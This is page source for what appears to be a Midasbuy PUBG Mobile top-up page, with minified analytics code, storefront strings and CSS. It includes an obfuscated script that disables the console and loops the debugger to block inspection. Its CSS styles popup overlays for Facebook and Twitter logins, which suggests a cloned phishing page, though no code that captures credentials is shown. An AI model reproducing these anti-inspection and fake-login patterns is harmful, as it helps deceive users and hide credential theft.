t={roots:[],rootsDomNum:[],time:performance.now()};e.forEach(function(e){e&&e.addedNodes&&e.addedNodes.forEach&&e.addedNodes.forEach(function(e){1!==e.nodeType||-1!==n.indexOf(e.nodeName.toLocaleLowerCase())||function e(t,n){return!(!t||t===document.documentElement)&&(-1!==n.indexOf(t)||e(t.parentElement,n))}(e,t.roots)||(t.roots.push(e),t.rootsDomNum.push(function e(t){var n=0;if(t&&1===t.nodeType){n++;var o=t.children;if(o&&o.length)for(var r=0;r<o.length;r++)n+=e(o[r])}return n}(e)||0))})}),t.roots.length&&f.push(t)})).observe(document,{childList:!0,subtree:!0}),setTimeout(function(){l.disconnect();var n=0,o=0,r=!1;f.forEach(function(e){for(var t=0;t<e.roots.length;t++)e.rootsDomNum[t]>n&&D(e.roots[t])&&(n=e.rootsDomNum[t],o=e.time)});for(var e=document.querySelectorAll(".fp-check"),i=[],t=0;t<e.length;t++)if("img"===e[t].tagName.toLowerCase()&&""!==e[t].src)i.push(e[t].src);else{var s=window.getComputedStyle(e[t]),a=/url\([\'\"](.+)[\'\"]\)/gi.exec(s.backgroundImage);a&&2===a.length&&i.push(a[1])}var u=0;window.performance.getEntriesByType("resource").some(function(n){return i.some(function(e,t){if(e===n.name)return n.responseEnd>u&&(u=n.responseEnd),(n.fetchStart<o||n.startTime<o)&&n.responseEnd>o&&(r=!0,o=n.responseEnd),i.splice(t,1),!0}),0===i.length}),0===o&&(o=u),c(r?o:o+25)},3e3)}catch(c){}}),ce.use(function(){var t=this;!function(e){try{var t=window.localStorage.getItem("AEGIS_ID");t||(t="xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(e){var t=16*Math.random()|0;return("x"==e?t:3&t|8).toString(16)}),window.localStorage.setItem("AEGIS_ID",t)),e(t||"")}catch(t){e("")}}(function(e){t.bean.aid=e})}),ce.use(function(e){var t;this.config.tjg&&(t=e,B||(B=!0,function(n){if("function"==typeof window.fetch){var o=window.fetch;window.fetch=function(e,t){return G(e)&&("object"==typeof t&&t?t.headers?t.headers instanceof Headers&&t.headers.append("X-Tjg-Json-Span-Context",F(n)):t.headers=new Headers({"X-Tjg-Json-Span-Context":F(n)}):t={headers:new Headers({"X-Tjg-Json-Span-Context":F(n)})}),o(e,t)}}}(t),function(e){if(window.XMLHttpRequest){var t=window.XMLHttpRequest.prototype.send,n=window.XMLHttpRequest.prototype.open;window.XMLHttpRequest.prototype.open=function(){return!this.__sendByAegis&&G(arguments[1])&&(this.useTjg=!0),n.apply(this,arguments)},window.XMLHttpRequest.prototype.send=function(){return this.useTjg&&this.setRequestHeader("X-Tjg-Json-Span-Context",F(e)),t.apply(this,arguments)}}}(t)))}),ce.use(function(){var e;this.config.reportAssetSpeed&&(this.extendBean("platform",(e=W.other,/\bAndroid\s*([^;]+)/.test(Z)?e=W.android:/\b(iPad|iPhone|iPod)\b.*? OS ([\d_]+)/.test(Z)&&(e=W.ios),e)),this.extendBean("x5Type",function(){var e=Q.other;if(0<=Z.indexOf("tbs")){var t=Z.match(/tbs\/([\d\.]+)/);e=t&&t[1]&&36541<=parseInt(t[1],10)?Q.newX5:Q.oldX5}return e}()),this.extendBean("netType",K.unknown))}),ce});
    var aegis = new Aegis({
        id: 1124,
        uin: __Report_INFO.midasuid,
        beforeReport: function(log) {
            // 这个错误是模拟器环境报的，不需要上报
            if(log.level == 4 && log.msg && log.msg.indexOf('__tbsRecieveNativeEvent__')!==-1) {
                return false
            }
        },
        reportApiSpeed: false, // 接口测速
        reportAssetSpeed: true // 静态资源测速
    });
    // aegis.infoAll('aegis: Interview from ' + __Report_INFO.midasuid);
</script>
<script type="text/javascript" src="https://midas.gtimg.cn/h5/overseah5/js/midas-oversea-h5page.js"></script>
<script type="text/javascript" src="https://www.midasbuy.com/oversea_web/static/js/jquery.js?jslib=1"></script>
<script type="text/javascript" src="https://www.midasbuy.com/oversea_web/static/js/swiper3_4_2/swiper.jquery.min.js?jslib=1"></script>
<script type="text/javascript" src="https://www.midasbuy.com/oversea_web/static/js/vue.min.2.6.10.js?jslib=1"></script>
<script type="text/javascript">
    !function(n){var r={};function o(e){if(r[e])return r[e].exports;var t=r[e]={i:e,l:!1,exports:{}};return n[e].call(t.exports,t,t.exports,o),t.l=!0,t.exports}o.m=n,o.c=r,o.d=function(e,t,n){o.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:n})},o.r=function(e){'undefined'!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:'Module'}),Object.defineProperty(e,'__esModule',{value:!0})},o.t=function(t,e){if(1&e&&(t=o(t)),8&e)return t;if(4&e&&'object'==typeof t&&t&&t.__esModule)return t;var n=Object.create(null);if(o.r(n),Object.defineProperty(n,'default',{enumerable:!0,value:t}),2&e&&'string'!=typeof t)for(var r in t)o.d(n,r,function(e){return t[e]}.bind(null,r));return n},o.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return o.d(t,'a',t),t},o.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},o.p="/oversea_web/static/",o(o.s="K4ZY")}({"14dY":function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var r=n("HkTM").default;t.default=r},"1Alt":function(e,t){var n=0,r=Math.random();e.exports=function(e){return'Symbol('.concat(void 0===e?'':e,')_',(++n+r).toString(36))}},"5MU4":function(e,t,n){var o=n("Bsg+");e.exports=function(e,t){if(!o(e))return e;var n,r;if(t&&'function'==typeof(n=e.toString)&&!o(r=n.call(e)))return r;if('function'==typeof(n=e.valueOf)&&!o(r=n.call(e)))return r;if(!t&&'function'==typeof(n=e.toString)&&!o(r=n.call(e)))return r;throw TypeError("Can't convert object to primitive value")}},"6mBe":function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t.default=function(e,t){var n=Object.prototype.toString.call(t).slice(8,-1);return null!=t&&n===e}},"9f4c":function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var o={};t.default=function(e,t,i){void 0===e&&(e=location.href),void 0===t&&(t='&'),void 0===i&&(i='=');var n=e.replace(/.+?\?/,'').replace(/#.*/,''),r=n.split(t);return o[n]||(o[n]=r.reduce(function(t,e){var n=e.indexOf(i);if(-1<n){var r=e.substr(0,n);if(r){var o=e.substr(n+1);try{t[r]=decodeURIComponent(o)}catch(e){t[r]=o}}}return t},{})),o[n]}},"9liC":function(e,t,n){var i=n("b8Rm");e.exports=function(r,o,e){if(i(r),void 0===o)return r;switch(e){case 1:return function(e){return r.call(o,e)};case 2:return function(e,t){return r.call(o,e,t)};case 3:return function(e,t,n){return r.call(o,e,t,n)}}return function(){return r.apply(o,arguments)}}},BUht:function(e,t,n){"use strict";n("d3/y"),Object.defineProperty(t,"__esModule",{value:!0}),t.default=void 0;var r=window.jQuery;t.default=r},"Bsg+":function(e,t){e.exports=function(e){return'object'==typeof e?null!==e:'function'==typeof e}},E7Vc:function(e,t){e.exports=function(e){try{return!!e()}catch(e){return!0}}},Entu:function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t.default=function(e){for(var t=1;t<=arguments.length;t++)if(arguments[t])for(var n in arguments[t])Object.prototype.hasOwnProperty.call(arguments[t],n)&&(e[n]=arguments[t][n]);return e}},GGqZ:function(e,t,n){e.exports=!n("E7Vc")(function(){return 7!=Object.defineProperty({},'a',{get:function(){return 7}}).a})},HWsP:function(e,t,n){e.exports=!n("GGqZ")&&!n("E7Vc")(function(){return 7!=Object.defineProperty(n("mggL")('div'),'a',{get:function(){return 7}}).a})},HkTM:function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var u=n("oGmy");t.default=function(e,t){var n,r=0;if(u.default(e)){var o=e.length;for(n=e[0];r<o&&!1!==t.call(n,n,r,e);n=e[++r]);}else for(var i in e)if(!1===t.call(e[i],e[i],i,e))break;return e}},JGfN:function(e,t,n){e.exports=n("ZVIm")('native-function-to-string',Function.toString)},JKhl:function(e,t,n){"use strict";n.d(t,"a",function(){return i});var r=n("9f4c"),o=n.n(r);function i(e){var t=o()().usePC,n=/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent);return!(!e&&'1'===t)&&n}},K4ZY:function(e,t,n){"use strict";n.r(t);var r=n("14dY"),p=n.n(r),o=n("Entu"),v=n.n(o),i=n("JKhl"),u=n("BUht"),c=n.n(u),m=window,b=m.__Report_INFO||{},f=1,g=Object(i.a)(),y={tradetime:{dbIndex:'6'},qquin:{dbIndex:'3'},resultcode:{dbIndex:'7'},servicecode:{dbIndex:'19'},pid:{dbIndex:'13'},iformat:{dbIndex:'21'},offerId:{dbIndex:'24'},offermedia:{dbIndex:'25'},quantity:{dbIndex:'23'},device:{dbIndex:'31'},action:{dbIndex:'20'},firstreq:{dbIndex:'37'},tokentime:{dbIndex:'38'},isbatch:{dbIndex:'43'},offerplatform:{dbIndex:'26'},setid:{dbIndex:'50'},costcoin:{dbIndex:'51'},requrl:{dbIndex:'36'},resultinfo:{dbIndex:'8',serialize:function(e){if(!e)return'';var n=[];return p()(e,function(e,t){n.push(t+'='+m.encodeURIComponent(e))}),n.join('&')}},askedqquin:{dbIndex:'4'},transactionid:{dbIndex:'29'}},a={setPage:function(e){this.page=e},click:function(e,t){if(e){if(!a.page)return m.console&&m.console.error('use report.setPage to set current page first');s('click.'+a.page+'_'+e,{pid:f,resultinfo:t||{}}),f++}},view:function(e,t){e&&(s('pageview.'+e,{pid:f,resultinfo:t||{}}),f++)},error:function(e,t){s('pageerror.'+e,{resultinfo:t||{}})},custom:function(e,t){s('custom.'+e,{resultinfo:t||{}})},doReport:function(){var e=_();if(e&&e.length){var t=e.shift();if(b.devMode){var n=m.console.log.bind(console),r=t.split('21=')[1].split('|')[0],o=t.split('|3=')[1].split('|')[0],i=t.split('24=')[1].split('|')[0],u=(t.split('13=')[1]&&t.split('13=')[1].split('|')[0],decodeURIComponent(t.split('8=')[1].split('|')[0]));console.group,n('%c iformat: ','background: #3b3; color: #fff',r),i&&n('%c offerid: ','background: #3b3; color: #fff',i),o&&n('%c openid: ','background: #3b3; color: #fff',o),u&&n('%c resultinfo: ','background: #3b3; color: #fff',u),n('%c url: ','background: #3b3; color: #fff',t),console.groupEnd}else(new Image).src=t;x(e)}setTimeout(a.doReport,200)},performance:function(e){var t,n,r=m.performance||m.webkitPerformance||m.msPerformance||m.mozPerformance,o=location.pathname.split('/');if(r&&r.getEntriesByType){if((n=r.getEntriesByType('navigation'))instanceof Array&&(t=n[0]),!t)return;if(t.loadEventEnd<=0||isNaN(t.loadEventEnd))return setTimeout(function(){a.performance(e)},200);e=e?'.'+e:'.'+o[o.length-1],b.from&&-1!==b.from.indexOf('emulator')&&(e+='.emulator'),s((2e4<=t.domContentLoadedEventEnd?'timer.overtime':'timer.page')+e,{resultinfo:{times:t.domContentLoadedEventEnd,html:t.responseEnd-t.requestStart,dns:t.domainLookupEnd-t.domainLookupStart,tcp:t.connectEnd-t.connectStart,res:t.domContentLoadedEventEnd-t.responseEnd}},'')}},network:function(e,t){s('req.'+e,{resultinfo:t||{}})}};function s(e,t,n){var r=b.reportUrl||'//szmg.qq.com/cgi-bin/log_data.fcg';if(n=n||'midasbuy',e&&n){var o,i,u,c={iformat:n+'.'+e},f=[],a=+new Date,s=(i=m.__PAY_INFO,u={},i&&(i.appid&&(u.appid=i.appid),i.pf&&(u.pf=i.pf),i.openid&&(u.openid=i.openid)),u);v()(c,t||{},{askedqquin:b.midasuid||'',costcoin:s.pf||'',device:b.countryCode?'oversea_web_v2_'+b.countryCode:'',isbatch:b.from,offerId:s.appid||'',quantity:'v2',offermedia:location.href,offerplatform:g?'h5':'pc',qquin:s.openid||'',requrl:encodeURIComponent(document.referrer||''),setid:encodeURIComponent(navigator.userAgent),tokentime:a,tradetime:a,transactionid:b.tid}),p()(c,function(e,t){(o=y[t])&&f.push(o.dbIndex+'='+encodeURIComponent(o.serialize?o.serialize(e):e))});var d=r+'?num=1&record0='+f.join('|')+'&rr='+Math.random(),l=_();l.push(d),x(l)}}m.report=a,setTimeout(function(){a.doReport()},100);var d=[],l=!(!sessionStorage||!c.a.isFunction(sessionStorage.setItem)||!c.a.isFunction(sessionStorage.getItem)||(sessionStorage.setItem('ss_test','1'),!sessionStorage.getItem('ss_test')||(sessionStorage.removeItem('ss_test'),0)));function x(e){l?sessionStorage.setItem('reportListStorage',JSON.stringify(e)):d=e}function _(){return l?JSON.parse(sessionStorage.getItem('reportListStorage')||'[]'):d}},P56o:function(e,t){var n=e.exports='undefined'!=typeof window&&window.Math==Math?window:'undefined'!=typeof self&&self.Math==Math?self:Function('return this')();'number'==typeof __g&&(__g=n)},PAFS:function(e,t,n){var r=n("Bsg+");e.exports=function(e){if(!r(e))throw TypeError(e+' is not an object!');return e}},R5TD:function(e,t){var n=e.exports={version:'2.6.11'};'number'==typeof __e&&(__e=n)},U1KF:function(e,t,n){var r=n("PAFS"),o=n("HWsP"),i=n("5MU4"),u=Object.defineProperty;t.f=n("GGqZ")?Object.defineProperty:function(e,t,n){if(r(e),t=i(t,!0),r(n),o)try{return u(e,t,n)}catch(e){}if('get'in n||'set'in n)throw TypeError('Accessors not supported!');return'value'in n&&(e[t]=n.value),e}},WWmS:function(e,t){e.exports=function(e,t){return{enumerable:!(1&e),configurable:!(2&e),writable:!(4&e),value:t}}},X6VK:function(e,t,n){var m=n("P56o"),b=n("R5TD"),g=n("tjmq"),y=n("sU/p"),x=n("9liC"),_='prototype',h=function(e,t,n){var r,o,i,u,c=e&h.F,f=e&h.G,a=e&h.S,s=e&h.P,d=e&h.B,l=f?m:a?m[t]||(m[t]={}):(m[t]||{})[_],p=f?b:b[t]||(b[t]={}),v=p[_]||(p[_]={});for(r in f&&(n=t),n)i=((o=!c&&l&&void 0!==l[r])?l:n)[r],u=d&&o?x(i,m):s&&'function'==typeof i?x(Function.call,i):i,l&&y(l,r,i,e&h.U),p[r]!=i&&g(p,r,u),s&&v[r]!=i&&(v[r]=i)};m.core=b,h.F=1,h.G=2,h.S=4,h.P=8,h.B=16,h.W=32,h.U=64,h.R=128,e.exports=h},ZVIm:function(e,t,n){var r=n("R5TD"),o=n("P56o"),i='__core-js_shared__',u=o[i]||(o[i]={});(e.exports=function(e,t){return u[e]||(u[e]=void 0!==t?t:{})})('versions',[]).push({version:r.version,mode:n("wEu9")?'pure':'global',copyright:'© 2019 Denis Pushkarev (zloirock.ru)'})},b8Rm:function(e,t){e.exports=function(e){if('function'!=typeof e)throw TypeError(e+' is not a function!');return e}},"d3/y":function(e,t,n){var r=n("X6VK");r(r.S+r.F*!n("GGqZ"),'Object',{defineProperty:n("U1KF").f})},"ezc+":function(e,t){var n={}.hasOwnProperty;e.exports=function(e,t){return n.call(e,t)}},mggL:function(e,t,n){var r=n("Bsg+"),o=n("P56o").document,i=r(o)&&r(o.createElement);e.exports=function(e){return i?o.createElement(e):{}}},oGmy:function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var r=n("6mBe");t.default=function(e){return r.default('Array',e)}},"sU/p":function(e,t,n){var i=n("P56o"),u=n("tjmq"),c=n("ezc+"),f=n("1Alt")('src'),r=n("JGfN"),o='toString',a=(''+r).split(o);n("R5TD").inspectSource=function(e){return r.call(e)},(e.exports=function(e,t,n,r){var o='function'==typeof n;o&&(c(n,'name')||u(n,'name',t)),e[t]!==n&&(o&&(c(n,f)||u(n,f,e[t]?''+e[t]:a.join(String(t)))),e===i?e[t]=n:r?e[t]?e[t]=n:u(e,t,n):(delete e[t],u(e,t,n)))})(Function.prototype,o,function(){return'function'==typeof this&&this[f]||r.call(this)})},tjmq:function(e,t,n){var r=n("U1KF"),o=n("WWmS");e.exports=n("GGqZ")?function(e,t,n){return r.f(e,t,o(1,n))}:function(e,t,n){return e[t]=n,e}},wEu9:function(e,t){e.exports=!1}});
</script>
<script type="text/javascript">
    var _0x3d88=['log','debug','info','error','exception','table','warn','trace','apply','debu','gger','don','return\x20(function()\x20','{}.constructor(\x22return\x20this\x22)(\x20)','console'];(function(_0x4b152f,_0x59d86c){var _0x5c135a=function(_0x5b5d0f){while(--_0x5b5d0f){_0x4b152f['push'](_0x4b152f['shift']());}};_0x5c135a(++_0x59d86c);}(_0x3d88,0x170));var _0x306c=function(_0x4b152f,_0x59d86c){_0x4b152f=_0x4b152f-0x0;var _0x5c135a=_0x3d88[_0x4b152f];return _0x5c135a;};(function(_0x2605bc){var _0x4c9a2c=function(){var _0x244728=!![];return function(_0x3efc74,_0x16c2ac){var _0x4d7b05=_0x244728?function(){if(_0x16c2ac){var _0x45ed49=_0x16c2ac[_0x306c('0x0')](_0x3efc74,arguments);_0x16c2ac=null;return _0x45ed49;}}:function(){};_0x244728=![];return _0x4d7b05;};}();var _0x4ed3d0=[_0x306c('0x1'),_0x306c('0x2'),_0x306c('0x3')];function _0x17f16e(){var _0x41d7ca=_0x4c9a2c(this,function(){var _0x6c13c9=function(){};var _0x187a25=function(){var _0x23d8ab;try{_0x23d8ab=Function(_0x306c('0x4')+_0x306c('0x5')+');')();}catch(_0x15bb1a){_0x23d8ab=window;}return _0x23d8ab;};var _0x4a78e1=_0x187a25();if(!_0x4a78e1[_0x306c('0x6')]){_0x4a78e1[_0x306c('0x6')]=function(_0x6c13c9){var _0x19ef79={};_0x19ef79[_0x306c('0x7')]=_0x6c13c9;_0x19ef79['warn']=_0x6c13c9;_0x19ef79[_0x306c('0x8')]=_0x6c13c9;_0x19ef79[_0x306c('0x9')]=_0x6c13c9;_0x19ef79[_0x306c('0xa')]=_0x6c13c9;_0x19ef79[_0x306c('0xb')]=_0x6c13c9;_0x19ef79[_0x306c('0xc')]=_0x6c13c9;_0x19ef79['trace']=_0x6c13c9;return _0x19ef79;}(_0x6c13c9);}else{_0x4a78e1[_0x306c('0x6')][_0x306c('0x7')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0xd')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0x8')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0x9')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0xa')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0xb')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0xc')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0xe')]=_0x6c13c9;}});_0x41d7ca();return function(){return eval(_0x4ed3d0[0x0]+_0x4ed3d0[0x1]);};}_0x2605bc[_0x4ed3d0[0x2]]=_0x17f16e();setInterval(_0x4ed3d0[0x2]+'()',0xc8);}(window));
</script>
<script type="text/javascript">
        var goServerUrl = "//www.midasbuy.com/midas/usc/v1/123123";
        var goPublicKey = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC+DHIWQ7lNnwufS03eXfHeytqUH2OWxoFMP67o38bq/7PB1NaikC3Wb4O8bKF5L2iyIVD2M/QxtcV178BIUP6qJxAHly6B+xC3FJXONeYMQfL3D3GxaSavR/vlJhoaacXpCn30dj1njeVjsMWjJrUjqOCHuMY3UX+h6LrBIB3iywIDAQAB";
        var langResource = {"title":"PUBG Mobile - Midasbuy","currencyBtn":"Purchase","errorMap":{"1138-1-12186":"Please choose another region to recharge.","1138-1-12200":"Please choose another region to recharge.","1138-1-12201":"Please choose another region to recharge.","1138-1-12202":"Please choose another region to recharge.","1138-1-12204":"Please choose another region to recharge.","1138-30051-12186":"Please choose another region to recharge.","1138-30051-12200":"Please choose another region to recharge.","1138-30051-12201":"Please choose another region to recharge.","1138-30051-12202":"Please choose another region to recharge.","1138-30051-12204":"Please choose another region to recharge."},"errorTips":{"attention":"Tip","confirm":"OK","invaliduserid":"Please enter a valid User ID.","tokenexpire":"Please refresh and try again."},"facebookButton":"Follow","footer":{"copyright":"COPYRIGHT © PUBG CORPORATION. ALL RIGHTS RESERVED."},"gameIdInvalid":"Invalid Game ID","gameIdRequired":"Enter Game ID","getInfoAsap":"Follow us on Facebook for more information.","header":{"accountSettings":"View Account","events":"Event Center","helpcenter":"Help Center","helpcenterLink":"https://cdn.midasbuy.com/oversea_web/faq/faq.html","index":"Home","login":"SIGN IN","logout":"Sign Out","pcenter":"Account  Setting","register":"CREATE ACCOUNT","transactionRecord":"Transcation Record"},"redeemBtn":"Redeem","shopBtn":"Shop","xianyici":"One Purchase Only","birthConfirmBtn":"OK","birthdayError":"Unfortunately we are unable to offer Midasbuy service to you at this time.","cancelPayBtn":"Back","cantFindId":"Couldn't find your Player ID?","checkRight1":"By ticking this box, you confirm that you have read and agreed to the Midasbuy <a target='_blank' href='https://www.midasbuy.com/oversea_web/static/terms.html'>Terms of Services</a> and understand how it applies to your use of Midasbuy.","checkRight2":"By ticking this box, you confirm that you have read and agreed to the Midasbuy <a target='_blank' href='https://www.midasbuy.com/oversea_web/static/privacy.html'>Privacy Policy</a>  and understand how it applies to your use of Midasbuy.","checkRight3":"By ticking this box, you agree to transfer your data outside of the European Economic Area. Midasbuy is a product offered by HIGH MORALE DEVELOPMENTS LTD. , a Hong Kong company who will process your data outside the European Economic Area (including Hong Kong Singapore United States and  the People's Republic of China) in order to provide the service. Please note that there are risks in such a transfer including your data being subject to differing legal regimes which may not afford it the same level of protection as that available in the country in which you are located. For more information please see our <a target='_blank' href='https://www.midasbuy.com/oversea_web/static/privacy.html'>Privacy Policy</a>.","choosePayAmount":"Select Product","choosePayMethod":"Payment Method","clausePopTitle":"Please check the following box to continue.","completedPay":"Payment completed","enterBirthday":"Enter birthday","enterBirthdayTitle":"Please confirm your birthday","findIdButton":"OK","findIdGuide1":"1. Enter the game","findIdGuide2":"2. Find your player ID","findIdTitle":"Couldn't find your Player ID?","gameIdLoginCharacName":"Nickname","gameIdLoginId":"Player ID","gameIdLoginInput":"Please enter Player ID","gameIdLoginModifyButton":"Edit","gameIdLoginOkButton":"OK","gameIdLoginTitle":"Player ID Verification","iknow":"OK","payButton":"Pay now","paymentFailButton":"Back","paymentFailTitle":"Payment failed.","pleasePayASAP":"Please complete the payment soon","queryingNoRes":"Payment result not found","queryingNoResTips":"There might be some lag. If the payment has been completed, please check the game later.","queryingPay":"Query has been made. Please wait","totalPrice":"Total:","wxQrCodeGuide1":"Tap to save QR code to album.","wxQrCodeGuide2":"Scan the QR code with WeChat to complete payment.","wxQrCodeOtherChoice":"You can also recharge from your computer.","wxQrCodeOtherLink":"www.midasbuy.com/hk/pubgm","wxQrCodeTitle":"Please scan the QR code with WeChat to complete payment."};
        var footerLan = {"cookieCloseBtn":"Save and close","cookieOff":"OFF","cookieOn":"ON","cookieP1":"We use cookies that are necessary to provide the service and also other cookies, including third-party cookies for performance and analysis. For more information on our cookie policy, please click here.    ","cookieP2":"These cookies are necessary to provide you with the service and to use some of its features, such as to facilitate transactions.","cookieP3":"These cookies are used to measure and analyse how the service is accessed, used, or is performing in order to provide you with a better   user experience and to maintain, operate and continually improve the service.","cookieT":"YOUR COOKIE PREFERENCES","cookieT2":"Necessary Cookies","cookieT3":"Analytics Cookies","copyright":"COPYRIGHT © PUBG CORPORATION. ALL RIGHTS RESERVED.","cstips1":"For customer service ","cstips2":"Please send email to help@midasbuy.com","feedback":"Feedback","privacystatement":"Privacy Policy","termofcookie":"Cookie Perferences","termofservice":"Terms of Service"};
        var showWelcomeBack = 1
        // 获取红点变量 需要考虑控制台还没配置变量的情况 在header.ts中的红点逻辑需要做相应的控制
        var redPointConfigs = {}
        var user = null
    </script>
<script type="text/javascript">
    var sdk_rules=[{
         rule:"^https:\\/\\/nearme\\.atlas\\.com\\/\\?.*",
         type:"url",
         url:"https://{env}.api.unipay.qq.com/h5/overseah5/views/oppo/result.html"
    },{
        rule:"^gojek:.*",
        type:"scheme"
    },{
        rule:"^intent:.*",
        type:"intent"
    },{
        rule:"^weixin:.*",
        type:"scheme"
    }];
</script>
<style type="text/css">
        input::-ms-clear {
            display: none;
        }
        .footer ul {
            margin-right: 15px;
        }
		.popup-login {
    background: rgba(0, 0, 0, 0.5);
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
}
.popup-box-login-fb {
    background: #ECEFF6;
	max-width: 350px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 6%;
	text-align: center;
	font-family: 'Teko';
	color: #000;
	border-radius: 10px;
}
.popup-box-login-twitter {
    background: #fff;
	max-width: 330px;
	height: 350px;
	position: relative;
	margin: 50px auto;
	margin-top: 10%;
	text-align: center;
	font-family: 'Teko';
	color: #000;
	border-radius: 10px;
}
.close-fb {
    background: #000;
	width: 20px;
	height: 20px;
	color: #fff;
	text-align: center;
	text-decoration: none;
	border-radius: 50%;
	border: 1.5px solid #fff;
	position: absolute;
	top: -8px;
	right: -10px;
	display: block;
}
.close-fb i {
    color: #fff;
    padding-top: 3px;
}
.close-other {
    background: #000;
	width: 20px;
	height: 20px;
	color: #fff;
	text-align: center;
	text-decoration: none;
	border-radius: 50%;
	border: 1.5px solid #fff;
	top: -8px;
	right: -10px;
	position: absolute;
	z-index: 9999999;
	display: block;
}
.close-other i {
    color: #fff;
    padding-top: 3px;
}
@media only screen and (max-width:600px) {
    .popup-box-login-fb {
        width: 330px;
	    margin-top: 20%;
	}
	.popup-box-login-twitter {
	    margin-top: 25%;
	}
}
</style>
<script>
        jQuery.fn.placeholder = function () {
            var i = document.createElement('input'),placeholdersupport ='placeholder' in i;
            if(!placeholdersupport){
                var inputs = jQuery(this);
                inputs.each(function(){
                    var input = jQuery(this),
                        text = input.attr('placeholder'),
                        pdl = 0,height = input.outerHeight(),
                        width = input.outerWidth(),
                        placeholder = jQuery('<span class="phTips">'+text+'</span>');
                        try{
                            pdl = input.css('padding-left').match(/\d*/i)[0] * 1;
                        }catch(e){
                            pdl = 5;
                        }
                        placeholder.css({
                            'margin-left': -(width-pdl),
                            'height':height,
                            'line-height':height+'px',
                            'position':'absolute',
                            'color': '#cecfc9',
                            'font-size' : '12px'
                        });
                        placeholder.click(function(){
                            input.focus();
                        });
                        if(input.val() != ''){
                            placeholder.css({display:'none'});
                        }else{
                            placeholder.css({display:'inline'});
                        }
                        placeholder.insertAfter(input);
                        input.keydown(function(e){
                            placeholder.css({display:'none'});
                        });
                        input.keyup(function(e){
                            if(jQuery(this).val() != ''){
                                placeholder.css({display:'none'});
                            }else{
                                placeholder.css({display:'inline'});
                            }
                        });
                    });
                }
            return this;
        };
    </script>
<script type="text/javascript">
        var loadJS = function(d, s, id,src) { if(!src){return;}
            var js, fjs = d.getElementsByTagName(s)[0];
            if (d.getElementById(id)) return;
            js = d.createElement(s);
            js.id = id;
            js.src = src;
            fjs.parentNode.insertBefore(js, fjs);
        };
        function scrollFun() {
            var wInnerH = $(window).height(); // 设备窗口的高度（不会变）
            var bScrollH = $(document).height(); // 滚动条总高度
            var footerH = $('.have-pay-sec .footer').outerHeight();
            var footerHeight = $('.footer').outerHeight();
            var headerHeight = $('.header-box').outerHeight();
            if (wInnerH === bScrollH) {
                $('.pay-sec').addClass('pay-sec-flex');
                $('.pay-sec').show();
                $('.pay-sec').css('bottom', footerH + 'px');
                $('.have-pay-sec .footer').show();
                $('.record .form-box-wrap-1 .form-box-warp').css('max-height', (wInnerH - headerHeight - 110) + 'px');
                $('.record .form-box-wrap-2 .form-box-warp').css('max-height', (wInnerH - headerHeight - 110) + 'px');
                if (
                    wInnerH -
                        ($('.special-box').offset() ? $('.special-box').offset().top : 0) -
                        $('.special-box').outerHeight() >
                    footerHeight + 16
                ) {
                    $('.special-foot .footer').show();
                } else {
                    $('.wrap').removeClass('special-foot');
                }
            } else {
                $('.record-detailt-pop .detailt-box').css('max-height', (wInnerH - headerHeight - 74) + 'px');
                $('.record .form-box-wrap-1 .form-box-warp').css('max-height', (wInnerH - headerHeight - 110) + 'px');
                $('.record .form-box-wrap-2 .form-box-warp').css('max-height', (wInnerH - headerHeight - 110) + 'px');
                $('.wrap').removeClass('special-foot');
            }
        }
        $(function () {
            setTimeout(function() {
                scrollFun();
            }, 0);
            window.addEventListener('resize', function() {
                scrollFun();
            });
          //  loadJS(document, 'script', 'gtag-jssdk','https://www.googletagmanager.com/gtag/js?id=UA-21773189-2');
            // 恢复 ga 禁用记录
            var gaSetting = window.localStorage && window.localStorage.getItem(gaKey());
            var active = gaSetting !== null ? gaSetting === 'true' : window.defaultDisableGaCountryList.indexOf(__Report_INFO.countryCode) === -1;
            var word = active ? (footerLan.cookieOn || 'ON') : (footerLan.cookieOff || 'OFF');
            $('.record-detailt-pop #gaStatus').html(word);
            if (active) {
                $('.record-detailt-pop .block .block-title .switch-box').addClass('open');
            }
            toggleGa(active);
            $('.record-detailt-pop #cookieSwitchBtn').on('click', function() {
                $(this).parent().toggleClass('open');
                var active = $(this).parent().hasClass('open');
                var word = active ? (footerLan.cookieOn || 'ON') : (footerLan.cookieOff || 'OFF');
                $('.record-detailt-pop #gaStatus').html(word);
                window.localStorage && window.localStorage.setItem(gaKey(), active);
                toggleGa(active);
            });
        });
        function toggleGa(active) {
            window['ga-disable-UA-21773189-2'] = !active;
            if (!active) {
                var topDomain = location.host.split('.').slice(-2).join('.');
                document.cookie = '_ga=;expires=-1;domain=' + topDomain + ';path=/';
                document.cookie = '_gid=;expires=-1;domain=' + topDomain + ';path=/';
                document.cookie = '_gat_gtag_UA_21773189_2=;expires=-1;domain=' + topDomain + ';path=/';
            }
        }
        function gaKey() {
            var isLogin = typeof muid !== 'undefined';
            var key = 'GASETTING_' +(isLogin ? muid : 'unlogged');
            return key;
        }
    </script>
